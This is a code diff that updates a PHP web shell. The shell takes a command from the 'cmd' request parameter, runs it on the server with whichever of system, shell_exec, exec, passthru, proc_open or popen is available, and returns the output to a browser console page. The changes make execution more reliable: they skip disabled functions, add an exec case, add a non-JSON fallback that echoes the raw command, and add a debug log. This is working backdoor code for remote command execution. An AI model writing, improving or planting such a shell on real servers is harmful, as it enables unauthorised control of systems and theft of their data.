@@ -16,17 +16,17 @@ function get_shell_command()
     static $shell_command;
 
     if ($shell_command === null) {
-        if (is_callable('system')) {
+        if (is_callable('system') && !is_function_disabled('system')) {
             $shell_command = 'system';
-        } elseif (is_callable('shell_exec')) {
+        } elseif (is_callable('shell_exec') && !is_function_disabled('shell_exec')) {
             $shell_command = 'shell_exec';
-        } elseif (is_callable('exec')) {
+        } elseif (is_callable('exec') && !is_function_disabled('exec')) {
             $shell_command = 'exec';
-        } elseif (is_callable('passthru')) {
+        } elseif (is_callable('passthru') && !is_function_disabled('passthru')) {
             $shell_command = 'passthru';
-        } elseif (is_callable('proc_open')) {
+        } elseif (is_callable('proc_open') && !is_function_disabled('proc_open')) {
             $shell_command = 'proc_open';
-        } elseif (is_callable('popen')) {
+        } elseif (is_callable('popen') && !is_function_disabled('popen')) {
             $shell_command = 'popen';
         }
     }
@@ -45,6 +45,9 @@ function execute_command($command)
 
         case 'shell_exec':
             return @shell_exec($command);
+
+        case 'exec':
+            return @exec($command);
 
         default:
             return 'None available function to run your command, sorry. :(';
@@ -104,12 +107,17 @@ function list_folder_files($dir)
 }
 function output_json($output = '')
 {
-    header('Content-Type: application/json;');
-    echo json_encode(array(
+    $output_data = array(
         'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
         'banner' => get_shell_prefix(),
         'stdout' => $output
-    ));
+    );
+    if (is_callable('json_encode')) {
+        header('Content-Type: application/json;');
+        echo json_encode($output_data);
+    } else {
+        echo $output_data['banner'], ' ', $_REQUEST['cmd'], PHP_EOL, $output;
+    }
     session_write_close();
     exit(0);
 }
@@ -252,7 +260,7 @@ if (isset($_REQUEST['cmd'])) {
             </div>
 
             <div id="console" role="tabpanel" class="tab-pane active">
-                <pre id="stdout"><?php echo shell_exec('cat /etc/motd') . PHP_EOL; ?></pre>
+                <pre id="stdout"><?php echo execute_command('cat /etc/motd') . PHP_EOL; ?></pre>
                 <div class="form-group">
                     <div class="input-group">
                         <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
@@ -284,6 +292,7 @@ if (isset($_REQUEST['cmd'])) {
                     return;
                 }
                 $.post(this.script_path, {cmd: command}, function(data) {
+                    console.log(data);
                     if (data.stdout) {
                         $('#stdout').append(data.banner + " " + command + "\n");
                         if (data.stdout !== null) {
